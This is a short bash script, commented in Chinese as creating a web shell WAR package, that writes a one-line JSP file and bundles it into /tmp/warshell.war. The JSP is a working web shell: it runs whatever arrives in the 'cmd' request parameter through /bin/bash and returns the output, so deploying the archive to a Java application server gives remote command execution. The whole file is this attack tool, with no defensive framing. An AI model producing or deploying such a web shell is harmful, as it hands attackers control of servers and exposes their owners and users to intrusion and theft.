#!/bin/bash
# 创建 Webshell WAR 包
set -euo pipefail

rm -rf /tmp/warshell /tmp/warshell.war
mkdir -p /tmp/warshell
cat > /tmp/warshell/index.jsp << 'JSPEOF'
<%@ page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>
JSPEOF
cd /tmp/warshell && jar -cf /tmp/warshell.war .
ls -la /tmp/warshell.war && echo "WAR_CREATED"
